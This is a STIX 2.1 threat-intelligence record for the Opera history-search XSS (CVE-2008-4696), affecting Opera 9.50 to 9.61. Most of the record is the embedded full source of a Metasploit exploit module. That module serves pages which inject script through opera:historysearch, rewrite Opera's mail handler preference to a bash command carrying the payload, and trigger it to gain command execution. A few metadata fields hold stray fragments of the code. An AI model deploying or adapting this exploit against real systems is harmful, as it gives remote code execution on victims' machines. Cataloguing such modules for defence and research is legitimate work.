{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--57331f44-0f6e-47a7-b0af-f303e5d8ba2f",
    "created": "2024-08-14T17:06:03.648788Z",
    "modified": "2024-08-14T17:06:03.648793Z",
    "name": "Opera historysearch XSS",
    "description": " Certain constructs are not escaped correctly by Opera's History Search results.  These can be used to inject scripts into the page, which can then be used to modify configuration settings and execute arbitrary commands.  Affects Opera versions between 9.50 and 9.61.  'License'        => BSD_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/opera_historysearch.rb",
            "external_id": "opera_historysearch.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-4696"
        },
        {
            "source_name": "reference",
            "url": "http://www.opera.com/support/kb/view/903/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :ua_name    => HttpClients::OPERA,\n  #  :javascript => true,\n  #  :rank       => ExcellentRanking, # reliable command execution\n  #  :vuln_test  => %Q{\n  #    v = parseFloat(opera.version());\n  #    if (9.5 < v && 9.62 > v) {\n  #      is_vuln = true;\n  #    }\n  #  },\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Opera historysearch XSS',\n      'Description'    => %q{\n          Certain constructs are not escaped correctly by Opera's History\n        Search results.  These can be used to inject scripts into the\n        page, which can then be used to modify configuration settings\n        and execute arbitrary commands.  Affects Opera versions between\n        9.50 and 9.61.\n      },\n      'License'        => BSD_LICENSE,\n      'Author'         =>\n        [\n          'Roberto Suggi', # Discovered the vulnerability\n          'Aviv Raff <avivra[at]gmail.com>', # showed it to be exploitable for code exec\n          'egypt',  # msf module\n        ],\n      'References'     =>\n        [\n          ['CVE',    '2008-4696'],\n          ['OSVDB',  '49472'],\n          ['BID',    '31869'],\n          ['URL',    'http://www.opera.com/support/kb/view/903/'],\n        ],\n      'Payload'        =>\n        {\n          'EXITFUNC' => 'process',\n          'Space'    => 4000,\n          'DisableNops' => true,\n          'BadChars' => \"\\x09\\x0a\\x0d\\x20\",\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl ruby telnet',\n            }\n        },\n      'Platform'       => %w{ unix },\n      'Targets'        =>\n        [\n          #[ 'Automatic', {  } ],\n          #[ 'Opera < 9.61 Windows',\n          #\t{\n          #\t\t'Platform' => 'win',\n          #\t\t'Arch' => ARCH_X86,\n          #\t}\n          #],\n          [ 'Opera < 9.61 Unix Cmd',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n            }\n          ],\n        ],\n      'DisclosureDate' => '2008-10-23', # Date of full-disclosure post showing code exec\n      'DefaultTarget'  => 0\n      ))\n  end\n\n  def on_request_uri(cli, request)\n\n    headers = {}\n    html_hdr = %Q^\n      <html>\n      <head>\n      <title>Loading</title>\n      ^\n    html_ftr = %Q^\n      </head>\n      <body >\n      <h1>Loading</h1>\n      </body></html>\n      ^\n\n    case request.uri\n    when /[?]jspayload/\n      p = regenerate_payload(cli)\n      if (p.nil?)\n        send_not_found(cli)\n        return\n      end\n      # We're going to run this through unescape(), so make sure\n      # everything is encoded\n      penc = Rex::Text.to_hex(p.encoded, \"%\")\n      content =\n        %Q{\n          var s = document.createElement(\"iframe\");\n\n          s.src=\"opera:config\";\n          s.id=\"config_window\";\n          document.body.appendChild(s);\n          config_window.eval(\n            \"var cmd = unescape('/bin/bash -c %22#{penc}%22 ');\" +\n            \"old_app = opera.getPreference('Mail','External Application');\" +\n            \"old_handler = opera.getPreference('Mail','Handler');\" +\n            \"opera.setPreference('Mail','External Application',cmd);\" +\n            \"opera.setPreference('Mail','Handler','2');\" +\n            \"app_link = document.createElement('a');\" +\n            \"app_link.setAttribute('href', 'mailto:a@b.com');\" +\n            \"app_link.click();\" +\n            \"setTimeout(function () {opera.setPreference('Mail','External Application',old_app)},0);\" +\n            \"setTimeout(function () {opera.setPreference('Mail','Handler',old_handler)},0);\" +\n          \"\");\n          setTimeout(function () {window.location='about:blank'},1);\n        }\n\n    when /[?]history/\n      js = %Q^\n        window.onload = function() {\n          location.href = \"opera:historysearch?q=*\";\n        }\n        ^\n      content = %Q^\n        #{html_hdr}\n        <script><!--\n        #{js}\n        //--></script>\n        #{html_ftr}\n        ^\n    when get_resource()\n      print_status(\"Sending #{self.name} for request #{request.uri}\")\n\n      js = %Q^\n        if (window.opera) {\n          var wnd = window;\n          while (wnd.parent != wnd) {\n            wnd = wnd.parent;\n          }\n          url = location.href;\n          wnd.location = url + \"?history#<script src='\" + url +\"?\" + \"jspayload=1'/><!--\";\n        }\n        ^\n      content = %Q^\n        #{html_hdr}\n        <script><!--\n        #{js}\n        //--></script>\n        #{html_ftr}\n        ^\n    else\n      print_status(\"Sending 404 for request #{request.uri}\")\n      send_not_found(cli)\n      return\n    end\n    content.gsub!(/^ {8}/, '')\n    content.gsub!(/\\t/, ' ')\n\n    send_response_html(cli, content, headers)\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-10-23, # Date of full-disclosure post showing code exec",
    "x_mitre_platforms": [
        "unix'"
    ]
}